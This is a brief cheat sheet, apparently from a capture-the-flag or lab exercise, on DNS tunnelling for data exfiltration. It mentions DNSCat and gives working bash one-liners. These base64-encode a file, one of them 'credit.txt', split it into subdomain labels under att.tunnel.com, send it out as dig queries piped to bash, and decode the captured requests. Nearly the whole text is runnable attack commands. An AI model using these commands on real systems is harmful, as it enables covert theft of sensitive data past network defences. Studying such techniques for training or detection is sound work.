
use DNSCat

Split queries (use fold -w X, with X + rest of the URL < 255 characters)
```bash
cat exfiltrate.txt | base64 | tr -d "\n"| fold -w 18 | sed -r 's/.*/&.att.tunnel.com/' 
```

Send DNS to victim
```markup
cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

Decode DNS request:
```markup
echo "MESSAGE.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
```